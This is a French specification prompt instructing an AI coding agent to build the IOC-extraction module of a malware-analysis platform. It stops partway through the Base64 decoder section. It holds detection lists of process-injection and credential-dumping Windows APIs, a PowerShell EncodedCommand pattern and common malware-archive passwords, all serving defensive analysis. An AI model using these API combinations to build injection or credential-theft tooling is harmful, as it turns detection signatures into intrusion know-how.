╔══════════════════════════════════════════════════════════════════════════════╗
║   PROMPT — AGENT D'EXÉCUTION PYTHON SENIOR                                  ║
║   ADMAP PLATFORM — MODULE M1 : IOC EXTRACTOR v3.0                           ║
║   Mission : Implémentation complète, production-ready                        ║
╚══════════════════════════════════════════════════════════════════════════════╝

════════════════════════════════════════════════════════════════════════════════
SECTION 0 — IDENTITÉ DE LA MISSION
════════════════════════════════════════════════════════════════════════════════

Tu es un Développeur Python Senior spécialisé en cybersécurité et architecture
microservices. Tu dois implémenter de zéro le Module M1 ("IOC Extractor") de la
plateforme ADMAP (Advanced Detection & Malware Analysis Platform), un outil SOC/CERT
industriel.

ADMAP est une plateforme en 5 modules indépendants :
  M1 — Extraction statique d'IOC          ← TON PÉRIMÈTRE EXCLUSIF
  M2 — Détection C2 (analyse PCAP)        ← HORS PÉRIMÈTRE
  M3 — Génération de règles YARA          ← HORS PÉRIMÈTRE
  M4 — Cartographie APT / clustering TTP  ← HORS PÉRIMÈTRE
  M5 — Attribution d'acteur APT (ML)      ← HORS PÉRIMÈTRE

Tu implémenteras UNIQUEMENT M1. Tout ce qui appartient à M2-M5 est interdit dans
ce module.

════════════════════════════════════════════════════════════════════════════════
SECTION 1 — CONTRAINTES ABSOLUES (non-négociables, priorité maximale)
════════════════════════════════════════════════════════════════════════════════

──────────────────────────────────────────────────────────────────────────────
CONTRAINTE 0 — ZÉRO INTERACTIVITÉ TERMINAL (priorité sur tout le reste)
──────────────────────────────────────────────────────────────────────────────

Le moteur M1 est un microservice programmatique pur. Il ne doit JAMAIS attendre
une saisie humaine à l'exécution.

INTERDICTIONS ABSOLUES dans l'intégralité du projet :
  ✗ Tout appel à input() ou sys.stdin.read() bloquant
  ✗ Tout while True de type menu interactif
  ✗ Toute fonction print_banner() ou affichage cosmétique non fonctionnel
  ✗ Toute boucle de consultation de résultats post-analyse
  ✗ Tout flag --no-menu (le menu n'existe pas)
  ✗ Tout input("Appuyez sur Entrée...") ou équivalent
  ✗ Toute logique CLI interactive

Le CLI (cli/main.py) utilise UNIQUEMENT Click avec des commandes et options
déclaratives. Il est entièrement non-interactif : arguments en entrée, exécution,
code de sortie (0 = succès, 1 = erreur), c'est tout.

──────────────────────────────────────────────────────────────────────────────
CONTRAINTE 1 — PÉRIMÈTRE STRICT M1
──────────────────────────────────────────────────────────────────────────────

M1 possède exclusivement :
  ✓ Extraction statique d'IOCs depuis binaires (PE/ELF), texte, rapports CTI
  ✓ Déobfuscation légère (XOR, Base64, ROT, PowerShell EncodedCommand)
  ✓ Filtrage des faux positifs (RFC1918, whitelists, TLD, modules système)
  ✓ Scoring de confiance heuristique (0-100, sans IA)
  ✓ Enrichissement de réputation via VirusTotal API v3 (optionnel)
  ✓ Export STIX 2.1, OpenIOC XML, MISP JSON, CSV Cytomic Orion

STRICTEMENT HORS PÉRIMÈTRE M1 — NE PAS IMPLÉMENTER :
  ✗ Règles YARA et leur génération → M3
  ✗ Analyse PCAP / trafic réseau / C2 / Scapy → M2
  ✗ Clustering APT / TTPs MITRE / DBSCAN → M4
  ✗ Attribution d'acteur / ML / XGBoost → M5
  ✗ Modèle NER (spaCy/DistilBERT) → M1-IA Phase 2 ultérieure
  ✗ Dashboard Streamlit → couche présentation globale
  ✗ Sandbox Docker d'analyse dynamique → infrastructure globale
  ✗ Analyse comportementale dynamique (exécution de fichiers)
  ✗ Tout subprocess sur le sample analysé

──────────────────────────────────────────────────────────────────────────────
CONTRAINTE 2 — CODE DE PRODUCTION
──────────────────────────────────────────────────────────────────────────────

  ✓ Python 3.11+ strict
  ✓ OOP : classes, héritage, interfaces ABC
  ✓ Typage complet : annotations Python 3.11+ sur chaque paramètre et retour
  ✓ Aucune variable globale mutable
  ✓ Aucun print() hors cli/main.py (structlog remplace print partout)
  ✓ Aucun magic number (tout en ClassVar nommée)
  ✓ Docstrings Google Style sur chaque méthode publique
  ✓ Tests pytest couverture ≥ 80 %
  ✓ Aucun placeholder pass sans implémentation réelle
  ✓ Aucun raise NotImplementedError sans message explicatif détaillé
  ✓ En-tête de fichier sur chaque module Python :
    """
    Module   : admap_m1.<chemin>
    Version  : 3.0.0
    Dépend   : [imports internes utilisés]
    """

──────────────────────────────────────────────────────────────────────────────
CONTRAINTE 3 — SÉCURITÉ
──────────────────────────────────────────────────────────────────────────────

  ✓ Tout fichier reçu est traité comme potentiellement malveillant
  ✓ Aucun subprocess sur le sample analysé (jamais)
  ✓ Parsers binaires résistants aux fichiers corrompus/malformés
    (chaque appel pefile/pyelftools dans try/except exhaustif)
  ✓ Validation stricte des inputs via Pydantic v2
  ✓ Sanitisation des chemins : Path.resolve() + vérification TEMP_DIR
  ✓ Les clés API ne doivent jamais apparaître dans les logs
    (masquage structlog systématique)
  ✓ Timeout sur toutes les opérations :
    - YARA (pas dans ce module)
    - VT API : 10s + retry
    - Archives : 60s
    - Désobfuscation : 30s par désobfuscateur

════════════════════════════════════════════════════════════════════════════════
SECTION 2 — STRUCTURE DE FICHIERS OBLIGATOIRE
════════════════════════════════════════════════════════════════════════════════

Créer exactement cette structure. Aucun fichier supplémentaire sans justification.

admap_m1/
├── core/
│   ├── __init__.py
│   ├── config.py                  # pydantic-settings, env ADMAP_M1_*
│   ├── logging.py                 # structlog JSON, masquage clés API
│   └── exceptions.py              # Hiérarchie ADMAPM1Error complète
│
├── models/
│   ├── __init__.py
│   ├── ioc.py                     # IOCType, IOCConfidenceLevel, RawIOC,
│   │                              # IOC, IOCBundle, FileMetadata, PEInfo,
│   │                              # FileHashes, AnalysisStats, VTResult
│   └── job.py                     # AnalysisJob, JobStatus, AnalysisOptions
│
├── parsers/
│   ├── __init__.py
│   ├── base.py                    # ABC BaseParser
│   ├── pe_parser.py               # pefile : métadonnées PE complètes
│   ├── elf_parser.py              # pyelftools (import optionnel)
│   ├── office_parser.py           # oletools (import optionnel)
│   └── archive_parser.py          # zipfile/gzip/tarfile + py7zr (opt)
│
├── deobfuscators/
│   ├── __init__.py
│   ├── base.py                    # ABC BaseDeobfuscator + DeobfuscationResult
│   ├── base64_decoder.py          # Base64 récursif + PS EncodedCommand
│   ├── xor_decoder.py             # Brute-force XOR 1-byte + scoring
│   ├── rot_decoder.py             # ROT-N (1-25) scoré
│   ├── powershell_decoder.py      # -EncodedCommand, AMSI bypass
│   └── packer_detector.py         # Entropie sections + noms connus
│
├── extractors/
│   ├── __init__.py
│   ├── base.py                    # ABC BaseExtractor
│   ├── regex_extractor.py         # Tous les patterns regex
│   ├── pe_extractor.py            # IOCs depuis structure PE
│   ├── elf_extractor.py           # IOCs depuis structure ELF
│   ├── vba_extractor.py           # IOCs depuis code VBA
│   └── string_extractor.py        # ASCII/Unicode strings depuis binaire
│
├── filters/
│   ├── __init__.py
│   ├── whitelist.py               # RFC1918, domaines, TLD, modules système
│   ├── deduplicator.py            # Normalisation + déduplication
│   └── defanger.py                # Defang/refang + détection auto
│
├── heuristics/
│   ├── __init__.py
│   ├── entropy.py                 # Shannon global + windowed + régions
│   ├── context_analyzer.py        # ExtractionContext : imports, sections, layers
│   └── ioc_scorer.py              # Scoring 0-100, bonus/malus, audit trail
│
├── enrichers/
│   ├── __init__.py
│   ├── base.py                    # ABC BaseEnricher
│   └── virustotal.py              # AsyncVTEnricher httpx + Semaphore + cache
│
├── exporters/
│   ├── __init__.py
│   ├── base.py                    # ABC BaseExporter → ExportResult
│   ├── stix_exporter.py           # STIX 2.1 (lib stix2)
│   ├── openioc_exporter.py        # OpenIOC 1.1 XML (xml.etree + minidom)
│   ├── misp_exporter.py           # MISP JSON offline + PyMISP connecté (opt)
│   └── cytomic_exporter.py        # CSV Cytomic Orion (csv.DictWriter)
│
├── pipeline/
│   ├── __init__.py
│   ├── orchestrator.py            # AnalysisPipeline 7 stages async
│   └── job_queue.py               # asyncio.Queue + worker + TTL cleanup
│
├── api/
│   ├── __init__.py
│   ├── main.py                    # create_app() factory + lifespan
│   ├── dependencies.py            # FastAPI DI : settings, queue, pipeline
│   └── routers/
│       ├── __init__.py
│       ├── analyze.py
│       ├── jobs.py
│       └── export.py
│
├── cli/
│   └── main.py                    # Click CLI non-interactif
│
├── tests/
│   ├── __init__.py
│   ├── conftest.py
│   ├── unit/
│   │   ├── __init__.py
│   │   ├── test_models.py
│   │   ├── test_filters.py
│   │   ├── test_regex_extractor.py
│   │   ├── test_pe_extractor.py
│   │   ├── test_deobfuscators.py
│   │   ├── test_ioc_scorer.py
│   │   └── test_exporters.py
│   └── integration/
│       ├── __init__.py
│       └── test_pipeline.py
│
├── .env.example
├── pyproject.toml
└── README.md

════════════════════════════════════════════════════════════════════════════════
SECTION 3 — CORE (core/)
════════════════════════════════════════════════════════════════════════════════

──────────────────────────────────────────────────────────────────────────────
core/exceptions.py
──────────────────────────────────────────────────────────────────────────────

Implémenter la hiérarchie complète suivante. Chaque classe a un __init__
(message: str, code: str, details: dict | None = None).
Le code est un identifiant snake_case MAJUSCULE : "EXTRACTION_ERROR".

class ADMAPM1Error(Exception):          # Racine
class ExtractionError(ADMAPM1Error):    # Erreur bloquante d'extraction
class ExtractionWarning(ADMAPM1Error):  # Non bloquante, pipeline continue
class PEParsingError(ExtractionError):  # Échec parsing PE
class ELFParsingError(ExtractionError): # Échec parsing ELF
class OfficeMacroError(ExtractionError):# Échec extraction VBA
class DeobfuscationError(ADMAPM1Error): # Déobfuscation impossible
class ValidationError(ADMAPM1Error):    # Input invalide
class FileTooLargeError(ValidationError):
class UnsupportedFileTypeError(ValidationError):
class ArchiveExtractionError(ExtractionError):
class ZipBombError(ArchiveExtractionError):
class VTRateLimitError(ADMAPM1Error):   # 429 VirusTotal
class VTAPIKeyError(ADMAPM1Error):      # 401 VirusTotal
class JobNotFoundError(ADMAPM1Error):
class JobCancelledError(ADMAPM1Error):

──────────────────────────────────────────────────────────────────────────────
core/config.py
──────────────────────────────────────────────────────────────────────────────

from pydantic_settings import BaseSettings, SettingsConfigDict
from pathlib import Path

class Settings(BaseSettings):
    model_config = SettingsConfigDict(
        env_file=".env",
        env_prefix="ADMAP_M1_",
        case_sensitive=False,
    )

    # API
    API_HOST: str = "0.0.0.0"
    API_PORT: int = 8000
    API_WORKERS: int = 1
    ALLOWED_ORIGINS: list[str] = ["*"]
    DEBUG: bool = False

    # Fichiers
    MAX_UPLOAD_SIZE_MB: int = 100
    ALLOWED_EXTENSIONS: set[str] = {
        ".exe", ".dll", ".bin", ".dat", ".pdf", ".doc", ".docx",
        ".xls", ".xlsx", ".docm", ".xlsm", ".zip", ".gz", ".7z",
        ".tar", ".txt", ".log", ".csv", ".json", ".xml", ".html",
        ".ps1", ".bat", ".vbs", ".js", ".hta", ".sh", ".elf", ".so",
    }
    TEMP_DIR: Path = Path("/tmp/admap_m1")

    # Pipeline
    MAX_RECURSION_DEPTH: int = 3
    MIN_CONFIDENCE_THRESHOLD: int = 20
    JOB_TTL_HOURS: int = 24
    MAX_QUEUE_SIZE: int = 100
    DEOBFUSCATION_TIMEOUT_SECONDS: int = 30
    ARCHIVE_TIMEOUT_SECONDS: int = 60

    # VirusTotal
    VT_API_KEY: str = ""
    VT_IS_PREMIUM: bool = False
    VT_MAX_PER_TYPE: int = 5
    VT_CACHE_TTL_HOURS: int = 4
    VT_TIMEOUT_SECONDS: int = 10
    VT_MAX_RETRIES: int = 3

    # Logging
    LOG_LEVEL: str = "INFO"
    LOG_FORMAT: str = "json"  # "json" | "console"

    # Archive protection
    MAX_ARCHIVE_DEPTH: int = 5
    MAX_EXTRACTED_SIZE_MB: int = 200

# Singleton
def get_settings() -> Settings:
    return Settings()

──────────────────────────────────────────────────────────────────────────────
core/logging.py
──────────────────────────────────────────────────────────────────────────────

Configurer structlog :
- Processeurs : add_log_level, add_logger_name, TimeStamper(fmt="iso"),
  StackInfoRenderer, JSONRenderer (prod) / ConsoleRenderer (debug)
- Masquage automatique des champs sensibles dans TOUS les logs :
  Les champs "api_key", "vt_api_key", "misp_key", "key", "password",
  "token" sont remplacés par "***REDACTED***" avant tout rendu
- Contexte propagé : job_id, file_hash, stage, duration_ms
- Factory : get_logger(name: str) -> BoundLogger
  Utilisée par tous les modules comme remplacement de print()

════════════════════════════════════════════════════════════════════════════════
SECTION 4 — MODÈLES PYDANTIC v2 (models/)
════════════════════════════════════════════════════════════════════════════════

──────────────────────────────────────────────────────────────────────────────
models/ioc.py — Implémentation complète et exhaustive
──────────────────────────────────────────────────────────────────────────────

from __future__ import annotations
from enum import Enum
from uuid import UUID, uuid4
from datetime import datetime
from pydantic import BaseModel, Field, field_validator, ConfigDict

class IOCType(str, Enum):
    IPV4          = "ipv4"
    IPV6          = "ipv6"
    DOMAIN        = "domain"
    URL           = "url"
    EMAIL         = "email"
    HASH_MD5      = "hash_md5"
    HASH_SHA1     = "hash_sha1"
    HASH_SHA256   = "hash_sha256"
    HASH_SSDEEP   = "hash_ssdeep"
    HASH_IMPHASH  = "hash_imphash"
    FILEPATH      = "filepath"
    FILENAME      = "filename"
    REGISTRY_KEY  = "registry_key"
    MUTEX         = "mutex"
    COMMAND       = "command"
    # NE PAS AJOUTER YARA_MATCH — appartient à M3

class IOCConfidenceLevel(str, Enum):
    CONFIRMED = "confirmed"   # score 80-100
    HIGH      = "high"        # score 60-79
    MEDIUM    = "medium"      # score 40-59
    LOW       = "low"         # score 20-39
    NOISE     = "noise"       # score 0-19

class RawIOC(BaseModel):
    """IOC brut retourné par un extracteur, avant scoring et filtrage."""
    type: IOCType
    value: str
    context_snippet: str = ""          # 64 chars autour du match dans le texte
    source_offset: int | None = None   # Offset exact dans le fichier binaire
    extraction_method: str = ""        # "pe_imports"|"regex_text"|"vba_macro"|...
    section_name: str | None = None    # Section PE d'origine si applicable
    entropy_context: float | None = None
    in_decoded_layer: bool = False     # True si extrait après déobfuscation

class IOC(BaseModel):
    """IOC finalisé après scoring, filtrage, defanging."""
    model_config = ConfigDict(frozen=True)
    id: UUID = Field(default_factory=uuid4)
    type: IOCType
    value: str               # Valeur réelle, toujours refangée
    value_defanged: str      # Ex: hxxps[://]evil[.]com
    confidence_score: int    # 0-100
    confidence_level: IOCConfidenceLevel
    context_snippet: str
    source_offset: int | None = None
    entropy_context: float | None = None
    tags: list[str] = Field(default_factory=list)
    extraction_method: str
    scoring_reasons: list[str] = Field(default_factory=list)  # Audit trail
    vt_result: VTResult | None = None
    first_seen: datetime = Field(default_factory=datetime.utcnow)

    @field_validator("confidence_score")
    @classmethod
    def validate_score(cls, v: int) -> int:
        if not 0 <= v <= 100:
            raise ValueError("confidence_score must be between 0 and 100")
        return v

class VTResult(BaseModel):
    """Résultat d'enrichissement VirusTotal pour un IOC."""
    value: str
    ioc_type: str
    found: bool
    malicious: int = 0
    suspicious: int = 0
    undetected: int = 0
    harmless: int = 0
    confidence_score: int = 0
    verdict: str = "UNKNOWN"           # "MALVEILLANT"|"SUSPECT"|"BÉNIN"|"INCONNU"
    file_type: str | None = None
    country: str | None = None
    as_owner: str | None = None
    reputation: int | None = None
    vt_link: str | None = None
    error: str | None = None

class FileHashes(BaseModel):
    md5: str
    sha1: str
    sha256: str
    ssdeep: str | None = None

class PESection(BaseModel):
    name: str
    virtual_address: str
    raw_size: int
    entropy: float
    characteristics: list[str]
    is_suspicious: bool                # entropy > 7.0 ou nom anormal

class PEInfo(BaseModel):
    compilation_timestamp: datetime | None = None
    entry_point: str
    sections: list[PESection] = Field(default_factory=list)
    imports: dict[str, list[str]] = Field(default_factory=dict)
    exports: list[str] = Field(default_factory=list)
    resources: list[str] = Field(default_factory=list)
    is_dotnet: bool = False
    is_64bit: bool = False
    suspicious_imports: list[str] = Field(default_factory=list)
    import_suspicion_score: int = 0    # 0-100

class FileMetadata(BaseModel):
    filename: str
    filesize: int
    filetype: str         # "PE32"|"PE64"|"ELF64"|"Office/OLE"|"ZIP"|"text/plain"
    magic_bytes: str      # Hex des 16 premiers octets
    hashes: FileHashes
    entropy: float
    is_packed: bool = False
    packer_name: str | None = None     # "UPX"|"MPRESS"|"PyInstaller"|None
    pe_info: PEInfo | None = None
    extracted_from: str | None = None  # "archive.zip/inner/mal.exe"

class AnalysisStats(BaseModel):
    total_iocs: int = 0
    by_type: dict[str, int] = Field(default_factory=dict)
    filtered_out: int = 0
    deobfuscation_layers: int = 0
    vt_enriched: int = 0
    duration_ms: int = 0

class IOCBundle(BaseModel):
    """Résultat complet d'une analyse M1."""
    bundle_id: UUID = Field(default_factory=uuid4)
    metadata: FileMetadata
    iocs: list[IOC] = Field(default_factory=list)
    # PAS de yara_matches — appartient à M3
    analysis_stats: AnalysisStats = Field(default_factory=AnalysisStats)
    created_at: datetime = Field(default_factory=datetime.utcnow)
    pipeline_version: str = "3.0.0"

──────────────────────────────────────────────────────────────────────────────
models/job.py
──────────────────────────────────────────────────────────────────────────────

class JobStatus(str, Enum):
    QUEUED    = "queued"
    RUNNING   = "running"
    COMPLETED = "completed"
    FAILED    = "failed"
    CANCELLED = "cancelled"

class AnalysisOptions(BaseModel):
    enable_vt_enrichment: bool = False
    vt_api_key: str | None = None
    vt_max_per_type: int = Field(default=5, ge=1, le=50)
    enable_deobfuscation: bool = True
    max_recursion_depth: int = Field(default=3, ge=1, le=10)
    export_formats: list[str] = Field(default_factory=list)
    min_confidence_threshold: int = Field(default=20, ge=0, le=100)

class AnalysisJob(BaseModel):
    job_id: UUID = Field(default_factory=uuid4)
    filename: str
    file_hash_sha256: str
    status: JobStatus = JobStatus.QUEUED
    progress: int = Field(default=0, ge=0, le=100)
    current_stage: str = ""
    created_at: datetime = Field(default_factory=datetime.utcnow)
    started_at: datetime | None = None
    completed_at: datetime | None = None
    error: str | None = None
    result_bundle_id: UUID | None = None
    options: AnalysisOptions = Field(default_factory=AnalysisOptions)

════════════════════════════════════════════════════════════════════════════════
SECTION 5 — PARSERS (parsers/)
════════════════════════════════════════════════════════════════════════════════

──────────────────────────────────────────────────────────────────────────────
parsers/base.py
──────────────────────────────────────────────────────────────────────────────

class BaseParser(ABC):
    """
    Interface commune pour tous les parsers.
    Un parser identifie le type de fichier et extrait ses MÉTADONNÉES.
    Il ne produit pas d'IOCs (c'est le rôle des extractors/).
    """

    @abstractmethod
    def can_handle(self, file_bytes: bytes, file_path: Path) -> bool:
        """True si ce parser est applicable à ce type de fichier."""
        ...

    @abstractmethod
    def parse_metadata(
        self,
        file_bytes: bytes,
        file_path: Path,
    ) -> FileMetadata:
        """
        Extrait les métadonnées complètes du fichier.
        Lève PEParsingError / ELFParsingError pour erreur bloquante.
        """
        ...

    @property
    @abstractmethod
    def parser_name(self) -> str:
        """Identifiant court : 'pe', 'elf', 'office', 'archive', 'text'"""
        ...

──────────────────────────────────────────────────────────────────────────────
parsers/pe_parser.py — Parsing PE exhaustif
──────────────────────────────────────────────────────────────────────────────

Import obligatoire : pefile
Import optionnel : ppdeep (pour SSDEEP)

SUSPICIOUS_IMPORTS: ClassVar[set[str]] = {
    # Injection de processus
    "VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread",
    "NtCreateThreadEx", "RtlCreateUserThread", "QueueUserAPC",
    "SetThreadContext", "SuspendThread", "ResumeThread",
    # Anti-analyse / évasion
    "IsDebuggerPresent", "CheckRemoteDebuggerPresent",
    "NtQueryInformationProcess", "GetTickCount", "QueryPerformanceCounter",
    "GetSystemTime", "NtDelayExecution", "SleepEx",
    # Persistance
    "RegSetValueEx", "RegCreateKeyEx", "SHSetValue",
    "CreateService", "ChangeServiceConfig", "OpenSCManager",
    # Réseau C2
    "WSAStartup", "socket", "connect", "send", "recv",
    "InternetOpen", "HttpOpenRequest", "HttpSendRequest",
    "WinHttpConnect", "WinHttpSendRequest", "URLDownloadToFile",
    # Chiffrement
    "CryptEncrypt", "CryptDecrypt", "BCryptEncrypt", "BCryptDecrypt",
    # Shell / exécution
    "ShellExecute", "WinExec", "CreateProcess", "NtCreateProcess",
    # Accès fichiers suspects
    "GetTempPath", "GetWindowsDirectory", "GetSystemDirectory",
    # Dump credentials
    "MiniDumpWriteDump", "ReadProcessMemory", "LsaEnumerateLogonSessions",
    "SamOpenDatabase", "LsaOpenPolicy",
}

INJECTION_COMBOS: ClassVar[list[tuple[set[str], int]]] = [
    ({"VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"}, 50),
    ({"VirtualAllocEx", "WriteProcessMemory", "NtCreateThreadEx"},   50),
    ({"SetThreadContext", "SuspendThread", "ResumeThread"},           40),
    ({"QueueUserAPC", "WriteProcessMemory"},                          35),
]

ANTIDEBUG_IMPORTS: ClassVar[set[str]] = {
    "IsDebuggerPresent", "CheckRemoteDebuggerPresent",
    "NtQueryInformationProcess", "GetTickCount",
}

KNOWN_PACKER_SECTIONS: ClassVar[dict[str, str]] = {
    "UPX0": "UPX", "UPX1": "UPX", "UPX2": "UPX",
    ".MPRESS1": "MPRESS", ".MPRESS2": "MPRESS",
    "_winzip_": "WinZip Self-Extractor",
    "nsp0": "NSIS", "nsp1": "NSIS",
    ".petite": "Petite",
    "ASPack": "ASPack",
}

HIGH_ENTROPY_THRESHOLD: ClassVar[float] = 7.0
PYINSTALLER_MAGIC: ClassVar[bytes] = b"PKG"

Méthodes à implémenter :

def can_handle(self, file_bytes, file_path) -> bool:
    """Magic bytes : file_bytes[:2] == b'MZ'"""

def parse_metadata(self, file_bytes, file_path) -> FileMetadata:
    """
    1. pefile.PE(data=file_bytes) dans try/except pefile.PEFormatError
    2. _build_pe_info(pe, file_bytes) → PEInfo complet
    3. Calculer hashes (hashlib MD5/SHA1/SHA256 + ppdeep si dispo)
    4. Calculer entropie globale via EntropyCalculator
    5. Détecter packer via _detect_packer(pe, file_bytes)
    6. Construire FileMetadata
    Lève PEParsingError si pefile.PE() échoue avec message détaillé.
    """

def _build_pe_info(self, pe: pefile.PE, file_bytes: bytes) -> PEInfo:
    """
    Extraire :
    - entry_point : hex(pe.OPTIONAL_HEADER.AddressOfEntryPoint)
    - compilation_timestamp : datetime depuis pe.FILE_HEADER.TimeDateStamp
    - sections : liste PESection avec nom, VA, raw_size, entropie, chars
    - imports : dict DLL → liste fonctions depuis pe.DIRECTORY_ENTRY_IMPORT
    - exports : liste depuis pe.DIRECTORY_ENTRY_EXPORT si présent
    - is_dotnet : présence de ".NET" dans import ou de CLR header
    - is_64bit : pe.FILE_HEADER.Machine == 0x8664
    - suspicious_imports : filtrage sur SUSPICIOUS_IMPORTS
    - import_suspicion_score : _score_import_suspicion(imports)
    """

def _score_import_suspicion(self, imports: dict[str, list[str]]) -> int:
    """
    Score composite 0-100 :
    Pour chaque INJECTION_COMBO : si tous les imports du combo présents → +score
    Si ≥ 3 imports de ANTIDEBUG_IMPORTS → +20
    Si CreateService ET RegSetValueEx présents → +30
    Si WSAStartup ET CryptEncrypt présents → +25
    Retourner min(100, somme des bonus)
    """

def _detect_packer(self, pe: pefile.PE, file_bytes: bytes) -> tuple[bool, str | None]:
    """
    1. Vérifier noms sections vs KNOWN_PACKER_SECTIONS
    2. Calculer entropie de chaque section → section > HIGH_ENTROPY_THRESHOLD
    3. Vérifier si EP est dans la dernière section (suspect)
    4. Chercher PYINSTALLER_MAGIC dans overlay
    Retourner (is_packed, packer_name | None)
    """

def _extract_overlay(self, pe: pefile.PE, file_bytes: bytes) -> bytes | None:
    """
    Calculer l'offset de fin de la dernière section PE.
    Retourner file_bytes[offset:] si > 0 bytes et < 50 MB.
    Sinon retourner None avec log WARNING.
    """

def _extract_version_info(self, pe: pefile.PE) -> list[str]:
    """
    Parcourir pe.FileInfo → StringTable → StringStructure.
    Extraire les valeurs de : FileDescription, CompanyName, ProductName,
    InternalName, OriginalFilename, LegalCopyright, Comments.
    Retourner la liste des chaînes (pour extraction IOC ultérieure).
    """

def _extract_resources(self, pe: pefile.PE) -> list[str]:
    """
    Parcourir pe.DIRECTORY_ENTRY_RESOURCE si présent.
    Extraire les données des ressources RT_STRING et RT_MANIFEST.
    Retourner les chaînes décodées en UTF-8 (ignorer les erreurs).
    """

──────────────────────────────────────────────────────────────────────────────
parsers/elf_parser.py
──────────────────────────────────────────────────────────────────────────────

Import optionnel :
try:
    from elftools.elf.elffile import ELFFile
    from elftools.elf.sections import SymbolTableSection
    ELFTOOLS_AVAILABLE = True
except ImportError:
    ELFTOOLS_AVAILABLE = False

ELF_MAGIC: ClassVar[bytes] = b'\x7fELF'

def can_handle(self, file_bytes, file_path) -> bool:
    return file_bytes[:4] == self.ELF_MAGIC

def parse_metadata(self, file_bytes, file_path) -> FileMetadata:
    """
    Si ELFTOOLS_AVAILABLE = False : retourner FileMetadata minimaliste
    (filetype="ELF", hashes calculés, entropie) avec log WARNING.
    Sinon :
    1. ELFFile(BytesIO(file_bytes))
    2. Extraire sections : .text, .data, .rodata, .bss, .dynamic
    3. Calculer entropie de chaque section
    4. Extraire symboles depuis SymbolTableSection
    5. Détecter architecture (e_machine : EM_386=3, EM_X86_64=62, EM_ARM=40)
    """

──────────────────────────────────────────────────────────────────────────────
parsers/office_parser.py
──────────────────────────────────────────────────────────────────────────────

Import optionnel :
try:
    from oletools.olevba import VBA_Parser, VBA_CODE
    from oletools.oleobj import OleObject
    OLETOOLS_AVAILABLE = True
except ImportError:
    OLETOOLS_AVAILABLE = False

OLE2_MAGIC: ClassVar[bytes] = b'\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1'

def can_handle(self, file_bytes, file_path) -> bool:
    ole2 = file_bytes[:8] == self.OLE2_MAGIC
    ooxml = (file_bytes[:2] == b'PK' and
             file_path.suffix.lower() in {'.docm', '.xlsm', '.pptm'})
    rtf = file_bytes[:4] == b'{\\rt'
    return ole2 or ooxml or rtf

def parse_metadata(self, file_bytes, file_path) -> FileMetadata:
    """
    Si OLETOOLS_AVAILABLE = False : FileMetadata minimaliste avec log WARNING.
    Sinon :
    1. VBA_Parser(filename=str(file_path), data=file_bytes)
    2. Extraire tous les modules VBA (code brut sous forme de str)
    3. Stocker le code VBA dans un attribut d'instance pour réutilisation
       par vba_extractor.py (via méthode get_vba_modules())
    4. Retourner FileMetadata avec filetype approprié
    """

def get_vba_modules(self) -> list[tuple[str, str]]:
    """Retourne liste (module_name, vba_code) extraits lors du dernier parse."""

──────────────────────────────────────────────────────────────────────────────
parsers/archive_parser.py — Récursif + protection zip bomb
──────────────────────────────────────────────────────────────────────────────

Imports : zipfile, gzip, tarfile (stdlib) + py7zr (optionnel)

MAX_DEPTH: ClassVar[int] = 5
MAX_EXTRACTED_SIZE: ClassVar[int] = 200 * 1024 * 1024  # 200 MB
COMMON_PASSWORDS: ClassVar[list[bytes]] = [
    b"infected", b"malware", b"virus", b"password",
    b"1234", b"sample", b"", b"abc123", b"sandbox", b"admin",
    b"infected!", b"malware!", b"0000", b"test",
]
ARCHIVE_MAGIC: ClassVar[dict[bytes, str]] = {
    b"PK\x03\x04": "zip",
    b"\x1f\x8b":   "gzip",
    b"7z\xbc\xaf": "7z",
}

def can_handle(self, file_bytes, file_path) -> bool:
    for magic, _ in self.ARCHIVE_MAGIC.items():
        if file_bytes[:len(magic)] == magic:
            return True
    # TAR : pas de magic fixe, vérifier par extension
    return file_path.suffix.lower() in {'.tar', '.tar.gz', '.tgz', '.tar.bz2'}

def extract_members(
    self,
    file_bytes: bytes,
    archive_path: Path,
    depth: int = 0,
    total_size_ref: list[int] | None = None,
) -> list[tuple[str, bytes]]:
    """
    Extrait les membres de l'archive sous forme (nom_relatif, contenu_bytes).
    Applique :
    - Vérification depth < MAX_DEPTH (sinon ArchiveExtractionError)
    - Vérification total_size_ref[0] < MAX_EXTRACTED_SIZE (sinon ZipBombError)
    - Tentative mots de passe sur ZIP chiffré
    Retourner liste de (chemin_relatif, bytes_du_membre).
    """

def _try_zip_passwords(self, zip_bytes: bytes) -> zipfile.ZipFile | None:
    """
    Tenter chaque password de COMMON_PASSWORDS.
    Retourner ZipFile ouvert ou None si aucun ne fonctionne.
    """

════════════════════════════════════════════════════════════════════════════════
SECTION 6 — DÉSOBFUSCATEURS (deobfuscators/)
════════════════════════════════════════════════════════════════════════════════

──────────────────────────────────────────────────────────────────────────────
deobfuscators/base.py
──────────────────────────────────────────────────────────────────────────────

class DeobfuscationResult(BaseModel):
    method: str
    original_size: int
    decoded_size: int
    confidence: float          # 0.0-1.0
    layers_found: int = 1
    key_used: str | None = None

class BaseDeobfuscator(ABC):
    @abstractmethod
    def detect(self, data: bytes | str) -> bool:
        """True si cette technique d'obfuscation est détectée dans data."""
        ...

    @abstractmethod
    def decode(
        self, data: bytes | str
    ) -> tuple[bytes | str, DeobfuscationResult]:
        """
        Désobfusque les données.
        Lève DeobfuscationError si décodage impossible.
        """
        ...

──────────────────────────────────────────────────────────────────────────────
deobfuscators/base64_decoder.py
──────────────────────────────────────────────────────────────────────────────

MAX_RECURSION: ClassVar[int] = 5
MIN_B64_LENGTH: ClassVar[int] = 20  # Caractères minimum pour considérer comme B64

B64_STANDARD_RE: ClassVar[re.Pattern] = re.compile(
    r"(?:[A-Za-z0-9+/]{4}){5,}(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?"
)
B64_URLSAFE_RE: ClassVar[re.Pattern] = re.compile(
    r"(?:[A-Za-z0-9_-]{4}){5,}(?:[A-Za-z0-9_-]{2}(?:==)?|[A-Za-z0-9_-]{3}=?)?"
)
PS_ENCODED_CMD_RE: ClassVar[re.Pattern] = re.compile(
    r"(?:powershell|pwsh)(?:\.exe)?\s+.*?-[eE](?:ncoded[cC]ommand)?\s+"
    r"([A-Za-z0-9+/=]{20,})",
    re.IGNORECASE,
)

def detect(self, data: bytes | str) -> bool:
    """True si B64_STANDARD_RE, B64_URLSAFE_RE, ou PS_ENCODED_CMD_RE trouvé."""

def decode(self, data: bytes | str) -> tuple[bytes | str, DeobfuscationResult]:
    """
    Ordre de tentative :
